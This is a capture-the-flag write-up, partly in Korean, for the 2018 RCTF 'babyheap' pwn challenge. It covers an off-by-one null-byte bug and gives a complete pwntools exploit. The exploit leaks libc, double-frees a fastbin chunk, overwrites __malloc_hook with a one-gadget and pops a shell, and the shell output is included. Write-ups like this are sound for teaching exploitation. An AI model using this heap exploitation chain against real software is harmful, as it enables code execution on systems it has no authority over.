# \[2018 RCTF] \[Pwn] babyheap

keyword : off by one, null byte poisoning, double free

## Checksec

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## Solution

```
1. Alloc
2. Show
3. Delete
4. Exit
choice: 
```

기본적인 기능은 위와 같습니다.

```c
unsigned __int64 __fastcall input_content_BC8(char *a1, unsigned int a2)
{
  char buf; // [rsp+13h] [rbp-Dh]
  unsigned int i; // [rsp+14h] [rbp-Ch]
  unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  for ( i = 0; i < a2; ++i )
  {
    buf = 0;
    if ( read(0, &buf, 1uLL) < 0 )
      error_B90((__int64)"read() error");
    a1[i] = buf;
    if ( buf == 10 )
      break;
  }
  a1[i] = 0;                                    // off by one
  return __readfsqword(0x28u) ^ v5;
}
```

content를 입력하는 함수에서 off by one 버그가 발생합니다. 이를 통해 heap size, prev\_inuse\_bit 조작이 가능합니다.

### Exploit Scenario

```
#0 input size : 0x80 -> heap size : 0x90    unsorted bin
#1 input size : 0x68 -> heap size : 0x70    fast bin
#2 input size : 0xf0 -> heap size : 0x100
#3 input size : 0x60 -> heap size : 0x70
#4 input size : 0x60 -> heap size : 0x70
```

1. 위와 같이 힙 할당
2. \#0, \#1 해제
3. 0x68 크기 할당(\#0) 및 off by one
\- 마지막 8바이트에 `prev_size(0x90+0x70)` 입력
4. \#2 해제
\- unsorted bin logic에 의해 할당된 영역도 병합
5. 0x80 크기 할당(\#1)
6. \#0 show -> `main_arena` 릭
7. 0x68 크기 할당(\#2)
\- \#0 \#2 overlap
9. \#0 \#3 \#2 순으로 해제 -> double free

## Exploit Code

```python
from pwn import *

def alloc(size, content):
	p.sendafter("choice: ", "1")
	p.sendafter("size: ", str(size))
	p.sendafter("content: ", content)

def show(idx):
        p.sendafter("choice: ", "2")
	p.sendafter("index: ", str(idx))

def delete(idx):
        p.sendafter("choice: ", "3")
	p.sendafter("index: ", str(idx))

l = ELF("./libc.so.6")
p = process("./babyheap", env={'LD_PRELOAD':'./libc.so.6'})

alloc(0x88, "0\n")
alloc(0x68, "1\n")
alloc(0xf8, "2\n")
alloc(0x60, "3\n")
alloc(0x60, "4\n")
alloc(0x60, "5\n")

delete(0)	# unsorted bin
delete(1)	# fast bin

# off prev_inuse_bit
alloc(0x68, "0"*0x60+p64(0x70+0x90))

delete(2)
alloc(0x88, "1\n")
show(0)
p.recvuntil("content: ")

leak = u64(p.recvline()[:-1].ljust(8, "\x00"))
libc = leak - (0x7ffff7dd1b78 - 0x00007ffff7a0d000)
malloc_hook = libc + l.symbols['__malloc_hook']
target = malloc_hook - 0x20 - 3
one_shot = libc + 0x4526a
log.info("leak          = 0x%x" % leak)
log.info("libc          = 0x%x" % libc)
log.info("__malloc_hook = 0x%x" % malloc_hook )
log.info("target        = 0x%x" % target)
log.info("one_shot      = 0x%x" % one_shot)

# double free
alloc(0x60, "2\n")
delete(0)
delete(3)
delete(2)


alloc(0x60, p64(target) + p64(0) + "\n")
alloc(0x60, "0\n")
alloc(0x60, "2\n")
alloc(0x60, "\x00"*19+p64(one_shot)+"\n")

p.sendafter("choice: ", "1")
p.sendafter("size: ", "1")

p.interactive()
```

## Result

```
[+] Starting local process './babyheap': pid 11840
[*] leak          = 0x7ffff7dd1b78
[*] libc          = 0x7ffff7a0d000
[*] __malloc_hook = 0x7ffff7dd1b10
[*] target        = 0x7ffff7dd1aed
[*] one_shot      = 0x7ffff7a5226a
[*] Switching to interactive mode
$ whoami
delspon
$ 
```
